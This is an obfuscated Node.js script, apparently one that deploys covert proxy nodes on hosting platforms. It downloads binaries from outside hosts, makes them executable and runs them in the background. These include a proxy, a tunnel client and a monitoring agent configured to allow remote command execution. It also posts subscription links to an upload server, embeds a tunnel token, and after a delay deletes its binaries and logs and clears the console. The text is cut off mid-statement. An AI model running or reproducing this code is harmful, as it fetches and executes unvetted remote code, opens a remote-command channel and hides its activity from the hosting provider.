const _0x2d953b=_0x265d;(function(_0x2ac1ba,_0x44a86b){const _0x3d5b70=_0x265d,_0x2f3f11=_0x2ac1ba();while(!![]){try{const _0x1a3bf5=parseInt(_0x3d5b70(0x17f))/0x1*(-parseInt(_0x3d5b70(0x1c1))/0x2)+-parseInt(_0x3d5b70(0x1a7))/0x3+parseInt(_0x3d5b70(0x116))/0x4+-parseInt(_0x3d5b70(0x1ac))/0x5+-parseInt(_0x3d5b70(0x19e))/0x6*(parseInt(_0x3d5b70(0x157))/0x7)+-parseInt(_0x3d5b70(0x189))/0x8+parseInt(_0x3d5b70(0x16a))/0x9;if(_0x1a3bf5===_0x44a86b)break;else _0x2f3f11['push'](_0x2f3f11['shift']());}catch(_0x2f9c83){_0x2f3f11['push'](_0x2f3f11['shift']());}}}(_0xf4e1,0x5eff6));const express=require('express'),app=express(),axios=require(_0x2d953b(0x11c)),os=require('os'),fs=require('fs'),path=require(_0x2d953b(0x16f)),{promisify}=require(_0x2d953b(0x144)),exec=promisify(require('child_process')['exec']),{execSync}=require(_0x2d953b(0x17a)),UPLOAD_URL=process[_0x2d953b(0x160)][_0x2d953b(0x198)]||'',PROJECT_URL=process['env'][_0x2d953b(0x108)]||'',AUTO_ACCESS=process[_0x2d953b(0x160)][_0x2d953b(0x118)]||![],FILE_PATH=process['env'][_0x2d953b(0x119)]||_0x2d953b(0x1a4),SUB_PATH=process[_0x2d953b(0x160)][_0x2d953b(0x175)]||_0x2d953b(0x180),PORT=process[_0x2d953b(0x160)][_0x2d953b(0x17b)]||process[_0x2d953b(0x160)][_0x2d953b(0x121)]||0xbb8,UUID=process[_0x2d953b(0x160)][_0x2d953b(0x132)]||_0x2d953b(0x135),NEZHA_SERVER=process[_0x2d953b(0x160)][_0x2d953b(0x1bf)]||'',NEZHA_PORT=process[_0x2d953b(0x160)][_0x2d953b(0x149)]||'',NEZHA_KEY=process[_0x2d953b(0x160)]['NEZHA_KEY']||'',ARGO_DOMAIN=process['env'][_0x2d953b(0x127)]||_0x2d953b(0x13a),ARGO_AUTH=process['env'][_0x2d953b(0x19f)]||_0x2d953b(0x1b1),ARGO_PORT=process[_0x2d953b(0x160)][_0x2d953b(0x13f)]||0x1f41,CFIP=process[_0x2d953b(0x160)]['CFIP']||_0x2d953b(0x1b6),CFPORT=process[_0x2d953b(0x160)][_0x2d953b(0x137)]||0x1bb,NAME=process[_0x2d953b(0x160)]['NAME']||'gdna';!fs[_0x2d953b(0x110)](FILE_PATH)?(fs[_0x2d953b(0x12f)](FILE_PATH),console[_0x2d953b(0x182)](FILE_PATH+_0x2d953b(0x1a9))):console['log'](FILE_PATH+_0x2d953b(0x17d));function generateRandomName(){const _0x1145a9=_0x2d953b,_0x2bd56b=_0x1145a9(0x14a);let _0x46be53='';for(let _0x3924b3=0x0;_0x3924b3<0x6;_0x3924b3++){_0x46be53+=_0x2bd56b['charAt'](Math[_0x1145a9(0x188)](Math[_0x1145a9(0x194)]()*_0x2bd56b[_0x1145a9(0x169)]));}return _0x46be53;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0xf4e1(){const _0x4bc443=['cdns.doon.eu.org','Download\x20','&path=%2Fvless-argo%3Fed%3D2560#','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20is\x20running','org','has','vmess','pop','NEZHA_SERVER','clear','6rpbaBV','from','.exe\x20>\x20nul\x202>&1','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','php\x20running\x20error:\x20','blackhole','Error\x20in\x20startserver:','/config.json\x20>/dev/null\x202>&1\x20&','send','PROJECT_URL','/tunnel.yml\x20run','includes','443','https://ipapi.co/json/','firefox','\x22\x20>\x20/dev/null\x202>&1','readdirSync','existsSync','2087','?security=tls&sni=','arm','http','arch','1566728yXtJaX','http://ip-api.com/json/','AUTO_ACCESS','FILE_PATH','vless','unlink','axios','https://amd64.ssss.nyc.mn/bot','https://amd64.ssss.nyc.mn/v1','npm\x20running\x20error:\x20','block','PORT','platform','nohup\x20','base64','/sub.txt\x20saved\x20successfully','createWriteStream','ARGO_DOMAIN','stream','country_code','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','status','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','rm\x20-rf\x20','mkdirSync','Unhandled\x20error\x20in\x20startserver:','readFileSync','UUID','split','toString','3d56d475-62b2-4660-8555-5f49e492ceb7','none','CFPORT','basename','127.0.0.1','gdman-no.7.7.e.0.6.3.0.0.0.7.4.0.1.0.0.2.ip6.arpa','Error\x20downloading\x20files:','Add\x20automatic\x20access\x20task\x20faild:\x20','/api/delete-nodes','unlinkSync','ARGO_PORT','writeFileSync','error','Empowerment\x20failed\x20for\x20','2053','util','aarch64','data','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','response','NEZHA_PORT','abcdefghijklmnopqrstuvwxyz','/vmess-argo','web\x20running\x20error:\x20','tunnel.json','\x20-p\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Error\x20executing\x20command:\x20','&fp=firefox&type=ws&host=','get','freedom','automatic\x20access\x20task\x20added\x20successfully','pipe','xtls-rprx-vision','28lKanOl','ARGO_DOMAIN:','\x20-s\x20','TunnelSecret','post','/dev/null','Unknown','listen','isFile','env','fileUrl','\x0aclient_secret:\x20','\x20successfully','?encryption=none&security=tls&sni=','utf-8','https://arm64.ssss.nyc.mn/bot','\x0a\x20\x20tunnel:\x20','set','length','19413648XwxAro','8443','boot.log','chmod','config.json','path','match','\x0a\x20\x20credentials-file:\x20','https://arm64.ssss.nyc.mn/agent','https://amd64.ssss.nyc.mn/web','substring','SUB_PATH','\x0a\x0avmess://','message','win32','Content-Type','child_process','SERVER_PORT','text/plain;\x20charset=utf-8','\x20already\x20exists','filter','254249eAQeLe','pai','2083','log','http\x20server\x20is\x20running\x20on\x20port:','https://amd64.ssss.nyc.mn/agent','\x0a\x20\x20\x20\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','https://arm64.ssss.nyc.mn/v1','floor','2292536SYfdsd','unshift','2096','forEach','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','App\x20is\x20running','test','fileName','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x20-c\x20\x22','tcp','random','quic','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','countryCode','UPLOAD_URL','tls','\x20>/dev/null\x202>&1\x20&','Hello\x20world!','\x20failed:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','332892jVsFQB','ARGO_AUTH','Empowerment\x20success\x20for\x20','/vless-argo','push','Nodes\x20uploaded\x20successfully','./tmp','&path=%2Ftrojan-argo%3Fed%3D2560#','https://oooo.serv00.net/add-url','2190477FkkxcJ','application/json','\x20is\x20created','/trojan-argo','direct','791215ASWhid','stringify','success','https+local://8.8.8.8/dns-query','join','eyJhIjoiMzgxM2MyZDM1Yjk0N2Q3ZDIwMzQ2MTAxOWQ0ZmU5OTIiLCJ0IjoiOTgxMTY0MmYtNmJkZi00MjgyLWE2ZjgtYzQ5ZDlkMWU4OWM5IiwicyI6Ik1qRXpPVFV3TkRrdFpXSTNZaTAwTUdGa0xXSTJOVGN0WmpNME9EbGpORGRsWmpNdyJ9','statSync','ArgoDomain:','Subscription\x20uploaded\x20successfully','catch'];_0xf4e1=function(){return _0x4bc443;};return _0xf4e1();}let npmPath=path[_0x2d953b(0x1b0)](FILE_PATH,npmName),phpPath=path[_0x2d953b(0x1b0)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x2d953b(0x1b0)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path[_0x2d953b(0x1b0)](FILE_PATH,'boot.log'),configPath=path[_0x2d953b(0x1b0)](FILE_PATH,_0x2d953b(0x16e));function deleteNodes(){const _0x589c3e=_0x2d953b;try{if(!UPLOAD_URL)return;if(!fs[_0x589c3e(0x110)](subPath))return;let _0x5eddd2;try{_0x5eddd2=fs['readFileSync'](subPath,_0x589c3e(0x165));}catch{return null;}const _0xa06f8b=Buffer[_0x589c3e(0x1c2)](_0x5eddd2,'base64')[_0x589c3e(0x134)](_0x589c3e(0x165)),_0x37068a=_0xa06f8b[_0x589c3e(0x133)]('\x0a')[_0x589c3e(0x17e)](_0x25fd13=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x25fd13));if(_0x37068a['length']===0x0)return;return axios[_0x589c3e(0x15b)](UPLOAD_URL+_0x589c3e(0x13d),JSON[_0x589c3e(0x1ad)]({'nodes':_0x37068a}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x533a1c=>{return null;}),null;}catch(_0x19715d){return null;}}function cleanupOldFiles(){const _0x146eaa=_0x2d953b;try{const _0x3f8cbe=fs[_0x146eaa(0x10f)](FILE_PATH);_0x3f8cbe[_0x146eaa(0x18c)](_0x317206=>{const _0x5e556c=_0x146eaa,_0x4bd972=path[_0x5e556c(0x1b0)](FILE_PATH,_0x317206);try{const _0x38dff6=fs[_0x5e556c(0x1b2)](_0x4bd972);_0x38dff6[_0x5e556c(0x15f)]()&&fs[_0x5e556c(0x13e)](_0x4bd972);}catch(_0x3e87d8){}});}catch(_0x5c554e){}}app[_0x2d953b(0x152)]('/',function(_0x5432bd,_0x555ddc){const _0x6c8480=_0x2d953b;_0x555ddc[_0x6c8480(0x1c9)](_0x6c8480(0x19b));});async function generateConfig(){const _0x4307cc=_0x2d953b,_0x39674a={'log':{'access':'/dev/null','error':_0x4307cc(0x15c),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x4307cc(0x156)}],'decryption':_0x4307cc(0x136),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x4307cc(0x14b),'dest':0xbbb},{'path':_0x4307cc(0x1aa),'dest':0xbbc}]},'streamSettings':{'network':_0x4307cc(0x193)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x4307cc(0x11a),'settings':{'clients':[{'id':UUID}],'decryption':_0x4307cc(0x136)},'streamSettings':{'network':_0x4307cc(0x193),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x4307cc(0x11a),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x4307cc(0x136),'wsSettings':{'path':_0x4307cc(0x1a1)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x4307cc(0x199),_0x4307cc(0x195)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4307cc(0x139),'protocol':_0x4307cc(0x1bd),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4307cc(0x114),_0x4307cc(0x199),_0x4307cc(0x195)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4307cc(0x136),'wsSettings':{'path':_0x4307cc(0x1aa)}},'sniffing':{'enabled':!![],'destOverride':[_0x4307cc(0x114),_0x4307cc(0x199),_0x4307cc(0x195)],'metadataOnly':![]}}],'dns':{'servers':[_0x4307cc(0x1af)]},'outbounds':[{'protocol':_0x4307cc(0x153),'tag':_0x4307cc(0x1ab)},{'protocol':_0x4307cc(0x1c6),'tag':_0x4307cc(0x120)}]};fs['writeFileSync'](path[_0x4307cc(0x1b0)](FILE_PATH,_0x4307cc(0x16e)),JSON[_0x4307cc(0x1ad)](_0x39674a,null,0x2));}function getSystemArchitecture(){const _0xd2cccd=_0x2d953b,_0x35933c=os[_0xd2cccd(0x115)]();return _0x35933c===_0xd2cccd(0x113)||_0x35933c==='arm64'||_0x35933c===_0xd2cccd(0x145)?_0xd2cccd(0x113):'amd';}function downloadFile(_0x1d7623,_0x55abd6,_0x47a52c){const _0x551b26=_0x2d953b,_0x3a4b19=_0x1d7623;!fs['existsSync'](FILE_PATH)&&fs[_0x551b26(0x12f)](FILE_PATH,{'recursive':!![]});const _0x183ca1=fs[_0x551b26(0x126)](_0x3a4b19);axios({'method':_0x551b26(0x152),'url':_0x55abd6,'responseType':_0x551b26(0x128)})['then'](_0x1d5e3f=>{const _0x5601c6=_0x551b26;_0x1d5e3f[_0x5601c6(0x146)][_0x5601c6(0x155)](_0x183ca1),_0x183ca1['on']('finish',()=>{const _0x44ef29=_0x5601c6;_0x183ca1['close'](),console[_0x44ef29(0x182)](_0x44ef29(0x1b7)+path[_0x44ef29(0x138)](_0x3a4b19)+_0x44ef29(0x163)),_0x47a52c(null,_0x3a4b19);}),_0x183ca1['on'](_0x5601c6(0x141),_0xa63da2=>{const _0x591164=_0x5601c6;fs[_0x591164(0x11b)](_0x3a4b19,()=>{});const _0x403089=_0x591164(0x1b7)+path[_0x591164(0x138)](_0x3a4b19)+_0x591164(0x19c)+_0xa63da2[_0x591164(0x177)];console[_0x591164(0x141)](_0x403089),_0x47a52c(_0x403089);});})[_0x551b26(0x1b5)](_0x2513a7=>{const _0xfa493a=_0x551b26,_0x336afd=_0xfa493a(0x1b7)+path['basename'](_0x3a4b19)+'\x20failed:\x20'+_0x2513a7['message'];console[_0xfa493a(0x141)](_0x336afd),_0x47a52c(_0x336afd);});}async function downloadFilesAndRun(){const _0x2a68d2=_0x2d953b,_0x3f9e97=getSystemArchitecture(),_0x46e4bb=getFilesForArchitecture(_0x3f9e97);if(_0x46e4bb[_0x2a68d2(0x169)]===0x0){console[_0x2a68d2(0x182)](_0x2a68d2(0x1b9));return;}const _0x42b0cb=_0x46e4bb['map'](_0x40e1d2=>{return new Promise((_0x2e05d1,_0x147b78)=>{const _0x169854=_0x265d;downloadFile(_0x40e1d2[_0x169854(0x190)],_0x40e1d2[_0x169854(0x161)],(_0xb77147,_0xc06dd2)=>{_0xb77147?_0x147b78(_0xb77147):_0x2e05d1(_0xc06dd2);});});});try{await Promise['all'](_0x42b0cb);}catch(_0x5c1477){console[_0x2a68d2(0x141)](_0x2a68d2(0x13b),_0x5c1477);return;}function _0x349237(_0x79d19a){const _0x38be50=_0x2a68d2,_0xbd2ffe=0x1fd;_0x79d19a[_0x38be50(0x18c)](_0x4dbf3b=>{const _0x3ba4fc=_0x38be50;fs['existsSync'](_0x4dbf3b)&&fs[_0x3ba4fc(0x16d)](_0x4dbf3b,_0xbd2ffe,_0x330fd6=>{const _0x30e81e=_0x3ba4fc;_0x330fd6?console[_0x30e81e(0x141)](_0x30e81e(0x142)+_0x4dbf3b+':\x20'+_0x330fd6):console[_0x30e81e(0x182)](_0x30e81e(0x1a0)+_0x4dbf3b+':\x20'+_0xbd2ffe[_0x30e81e(0x134)](0x8));});});}const _0x3edeb3=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x349237(_0x3edeb3);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x483281=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x2a68d2(0x133)](':')[_0x2a68d2(0x1be)]():'',_0x1c7bab=new Set([_0x2a68d2(0x10b),_0x2a68d2(0x16b),_0x2a68d2(0x18b),_0x2a68d2(0x111),_0x2a68d2(0x181),_0x2a68d2(0x143)]),_0x1f0bac=_0x1c7bab[_0x2a68d2(0x1bc)](_0x483281)?'true':'false',_0x1fdf20=_0x2a68d2(0x162)+NEZHA_KEY+_0x2a68d2(0x12a)+NEZHA_SERVER+_0x2a68d2(0x1c4)+_0x1f0bac+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x2a68d2(0x140)](path[_0x2a68d2(0x1b0)](FILE_PATH,'config.yaml'),_0x1fdf20);const _0xf0b206='nohup\x20'+phpPath+_0x2a68d2(0x192)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0xf0b206),console[_0x2a68d2(0x182)](phpName+_0x2a68d2(0x1ba)),await new Promise(_0x53febe=>setTimeout(_0x53febe,0x3e8));}catch(_0x3827b7){console[_0x2a68d2(0x141)](_0x2a68d2(0x1c5)+_0x3827b7);}}else{let _0x16d56f='';const _0x3b108e=[_0x2a68d2(0x10b),_0x2a68d2(0x16b),_0x2a68d2(0x18b),_0x2a68d2(0x111),'2083',_0x2a68d2(0x143)];_0x3b108e[_0x2a68d2(0x10a)](NEZHA_PORT)&&(_0x16d56f='--tls');const _0xd74b63=_0x2a68d2(0x123)+npmPath+_0x2a68d2(0x159)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2a68d2(0x14e)+NEZHA_KEY+'\x20'+_0x16d56f+_0x2a68d2(0x12b);try{await exec(_0xd74b63),console[_0x2a68d2(0x182)](npmName+_0x2a68d2(0x1ba)),await new Promise(_0x83bda0=>setTimeout(_0x83bda0,0x3e8));}catch(_0xdece28){console[_0x2a68d2(0x141)](_0x2a68d2(0x11f)+_0xdece28);}}}else console[_0x2a68d2(0x182)](_0x2a68d2(0x191));const _0x313bbc=_0x2a68d2(0x123)+webPath+'\x20-c\x20'+FILE_PATH+_0x2a68d2(0x1c8);try{await exec(_0x313bbc),console[_0x2a68d2(0x182)](webName+'\x20is\x20running'),await new Promise(_0x55afb3=>setTimeout(_0x55afb3,0x3e8));}catch(_0x1d0cae){console['error'](_0x2a68d2(0x14c)+_0x1d0cae);}if(fs[_0x2a68d2(0x110)](botPath)){let _0x569cab;if(ARGO_AUTH[_0x2a68d2(0x170)](/^[A-Z0-9a-z=]{120,250}$/))_0x569cab=_0x2a68d2(0x12d)+ARGO_AUTH;else ARGO_AUTH[_0x2a68d2(0x170)](/TunnelSecret/)?_0x569cab='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x2a68d2(0x109):_0x569cab=_0x2a68d2(0x14f)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x569cab+_0x2a68d2(0x19a)),console[_0x2a68d2(0x182)](botName+_0x2a68d2(0x1ba)),await new Promise(_0x4593ee=>setTimeout(_0x4593ee,0x7d0));}catch(_0x41b407){console[_0x2a68d2(0x141)](_0x2a68d2(0x150)+_0x41b407);}}await new Promise(_0x476b37=>setTimeout(_0x476b37,0x1388));}function _0x265d(_0x4c177a,_0x3f7f41){_0x4c177a=_0x4c177a-0x108;const _0xf4e12a=_0xf4e1();let _0x265d7e=_0xf4e12a[_0x4c177a];return _0x265d7e;}function getFilesForArchitecture(_0x55d5ed){const _0x2b9b90=_0x2d953b;let _0x4e0ab8;_0x55d5ed===_0x2b9b90(0x113)?_0x4e0ab8=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x2b9b90(0x166)}]:_0x4e0ab8=[{'fileName':webPath,'fileUrl':_0x2b9b90(0x173)},{'fileName':botPath,'fileUrl':_0x2b9b90(0x11d)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1d794e=_0x55d5ed===_0x2b9b90(0x113)?_0x2b9b90(0x172):_0x2b9b90(0x184);_0x4e0ab8[_0x2b9b90(0x18a)]({'fileName':npmPath,'fileUrl':_0x1d794e});}else{const _0x1ed6b7=_0x55d5ed==='arm'?_0x2b9b90(0x187):_0x2b9b90(0x11e);_0x4e0ab8['unshift']({'fileName':phpPath,'fileUrl':_0x1ed6b7});}}return _0x4e0ab8;}function argoType(){const _0x1e0183=_0x2d953b;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1e0183(0x182)](_0x1e0183(0x18d));return;}if(ARGO_AUTH[_0x1e0183(0x10a)](_0x1e0183(0x15a))){fs['writeFileSync'](path[_0x1e0183(0x1b0)](FILE_PATH,_0x1e0183(0x14d)),ARGO_AUTH);const _0x448cd7=_0x1e0183(0x167)+ARGO_AUTH[_0x1e0183(0x133)]('\x22')[0xb]+_0x1e0183(0x171)+path['join'](FILE_PATH,_0x1e0183(0x14d))+_0x1e0183(0x186)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x1e0183(0x196);fs[_0x1e0183(0x140)](path[_0x1e0183(0x1b0)](FILE_PATH,'tunnel.yml'),_0x448cd7);}else console[_0x1e0183(0x182)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x422257=_0x2d953b;let _0x44ef03;if(ARGO_AUTH&&ARGO_DOMAIN)_0x44ef03=ARGO_DOMAIN,console[_0x422257(0x182)](_0x422257(0x158),_0x44ef03),await _0xcf34f2(_0x44ef03);else try{const _0x4bafa0=fs[_0x422257(0x131)](path[_0x422257(0x1b0)](FILE_PATH,_0x422257(0x16c)),_0x422257(0x165)),_0x46815c=_0x4bafa0['split']('\x0a'),_0x564de1=[];_0x46815c['forEach'](_0x30203d=>{const _0x51af04=_0x422257,_0x538d11=_0x30203d[_0x51af04(0x170)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x538d11){const _0x58b354=_0x538d11[0x1];_0x564de1[_0x51af04(0x1a2)](_0x58b354);}});if(_0x564de1[_0x422257(0x169)]>0x0)_0x44ef03=_0x564de1[0x0],console[_0x422257(0x182)](_0x422257(0x1b3),_0x44ef03),await _0xcf34f2(_0x44ef03);else{console[_0x422257(0x182)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x422257(0x1b0)](FILE_PATH,_0x422257(0x16c)));async function _0x22d97b(){const _0x101193=_0x422257;try{process[_0x101193(0x122)]===_0x101193(0x178)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x101193(0x1c3)):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName[_0x101193(0x174)](0x1)+_0x101193(0x10e));}catch(_0x28f79f){}}_0x22d97b(),await new Promise(_0x1a99e4=>setTimeout(_0x1a99e4,0xbb8));const _0x2729a2='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x422257(0x19d)+ARGO_PORT;try{await exec(_0x422257(0x123)+botPath+'\x20'+_0x2729a2+_0x422257(0x19a)),console[_0x422257(0x182)](botName+'\x20is\x20running'),await new Promise(_0x8d0566=>setTimeout(_0x8d0566,0xbb8)),await extractDomains();}catch(_0xf92b28){console[_0x422257(0x141)](_0x422257(0x150)+_0xf92b28);}}}catch(_0x1233a6){console['error']('Error\x20reading\x20boot.log:',_0x1233a6);}async function _0x27b242(){const _0x51de1c=_0x422257;try{const _0x41b3f1=await axios[_0x51de1c(0x152)](_0x51de1c(0x10c),{'timeout':0xbb8});if(_0x41b3f1['data']&&_0x41b3f1[_0x51de1c(0x146)][_0x51de1c(0x129)]&&_0x41b3f1['data']['org'])return _0x41b3f1['data']['country_code']+'_'+_0x41b3f1[_0x51de1c(0x146)]['org'];}catch(_0x2264f7){try{const _0x424b06=await axios[_0x51de1c(0x152)](_0x51de1c(0x117),{'timeout':0xbb8});if(_0x424b06['data']&&_0x424b06[_0x51de1c(0x146)][_0x51de1c(0x12c)]===_0x51de1c(0x1ae)&&_0x424b06[_0x51de1c(0x146)]['countryCode']&&_0x424b06[_0x51de1c(0x146)][_0x51de1c(0x1bb)])return _0x424b06[_0x51de1c(0x146)][_0x51de1c(0x197)]+'_'+_0x424b06['data'][_0x51de1c(0x1bb)];}catch(_0xbd032b){}}return _0x51de1c(0x15d);}async function _0xcf34f2(_0x52f069){const _0x1e20ea=await _0x27b242(),_0x533b53=NAME?NAME+'-'+_0x1e20ea:_0x1e20ea;return new Promise(_0x1dfafd=>{setTimeout(()=>{const _0x4a28db=_0x265d,_0xcbdf39={'v':'2','ps':''+_0x533b53,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4a28db(0x136),'net':'ws','type':'none','host':_0x52f069,'path':'/vmess-argo?ed=2560','tls':_0x4a28db(0x199),'sni':_0x52f069,'alpn':'','fp':_0x4a28db(0x10d)},_0x3ebf5f='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x4a28db(0x164)+_0x52f069+_0x4a28db(0x151)+_0x52f069+_0x4a28db(0x1b8)+_0x533b53+_0x4a28db(0x176)+Buffer[_0x4a28db(0x1c2)](JSON[_0x4a28db(0x1ad)](_0xcbdf39))['toString']('base64')+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x4a28db(0x112)+_0x52f069+'&fp=firefox&type=ws&host='+_0x52f069+_0x4a28db(0x1a5)+_0x533b53+_0x4a28db(0x185);console[_0x4a28db(0x182)](Buffer[_0x4a28db(0x1c2)](_0x3ebf5f)[_0x4a28db(0x134)]('base64')),fs[_0x4a28db(0x140)](subPath,Buffer[_0x4a28db(0x1c2)](_0x3ebf5f)[_0x4a28db(0x134)](_0x4a28db(0x124))),console[_0x4a28db(0x182)](FILE_PATH+_0x4a28db(0x125)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x329806,_0x4a7f8b)=>{const _0x193f60=_0x4a28db,_0x3e6824=Buffer[_0x193f60(0x1c2)](_0x3ebf5f)[_0x193f60(0x134)]('base64');_0x4a7f8b[_0x193f60(0x168)](_0x193f60(0x179),_0x193f60(0x17c)),_0x4a7f8b[_0x193f60(0x1c9)](_0x3e6824);}),_0x1dfafd(_0x3ebf5f);},0x7d0);});}}async function uploadNodes(){const _0xbe3b8e=_0x2d953b;if(UPLOAD_URL&&PROJECT_URL){const _0x567452=PROJECT_URL+'/'+SUB_PATH,_0x470c6f={'subscription':[_0x567452]};try{const _0xa545ae=await axios[_0xbe3b8e(0x15b)](UPLOAD_URL+'/api/add-subscriptions',_0x470c6f,{'headers':{'Content-Type':'application/json'}});return _0xa545ae&&_0xa545ae[_0xbe3b8e(0x12c)]===0xc8?(console['log'](_0xbe3b8e(0x1b4)),_0xa545ae):null;}catch(_0xc7e23){if(_0xc7e23[_0xbe3b8e(0x148)]){if(_0xc7e23[_0xbe3b8e(0x148)][_0xbe3b8e(0x12c)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x24ec75=fs[_0xbe3b8e(0x131)](listPath,_0xbe3b8e(0x165)),_0x55831b=_0x24ec75['split']('\x0a')[_0xbe3b8e(0x17e)](_0x1e5636=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xbe3b8e(0x18f)](_0x1e5636));if(_0x55831b[_0xbe3b8e(0x169)]===0x0)return;const _0x13ae2b=JSON[_0xbe3b8e(0x1ad)]({'nodes':_0x55831b});try{const _0x504146=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x13ae2b,{'headers':{'Content-Type':_0xbe3b8e(0x1a8)}});return _0x504146&&_0x504146['status']===0xc8?(console[_0xbe3b8e(0x182)](_0xbe3b8e(0x1a3)),_0x504146):null;}catch(_0x3ac4f3){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4fd058=_0x265d,_0x4c2b01=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4c2b01['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4c2b01[_0x4fd058(0x1a2)](phpPath);process[_0x4fd058(0x122)]===_0x4fd058(0x178)?exec('del\x20/f\x20/q\x20'+_0x4c2b01['join']('\x20')+'\x20>\x20nul\x202>&1',_0x4c2b9d=>{const _0x52b5d7=_0x4fd058;console[_0x52b5d7(0x1c0)](),console[_0x52b5d7(0x182)](_0x52b5d7(0x18e)),console[_0x52b5d7(0x182)](_0x52b5d7(0x147));}):exec(_0x4fd058(0x12e)+_0x4c2b01['join']('\x20')+'\x20>/dev/null\x202>&1',_0x3194ef=>{const _0x3168e9=_0x4fd058;console['clear'](),console[_0x3168e9(0x182)](_0x3168e9(0x18e)),console[_0x3168e9(0x182)](_0x3168e9(0x147));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x50d793=_0x2d953b;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x50d793(0x182)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x29cb1f=await axios[_0x50d793(0x15b)](_0x50d793(0x1a6),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x50d793(0x1a8)}});return console[_0x50d793(0x182)](_0x50d793(0x154)),_0x29cb1f;}catch(_0x53ec0b){return console[_0x50d793(0x141)](_0x50d793(0x13c)+_0x53ec0b[_0x50d793(0x177)]),null;}}async function startserver(){const _0x28632f=_0x2d953b;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 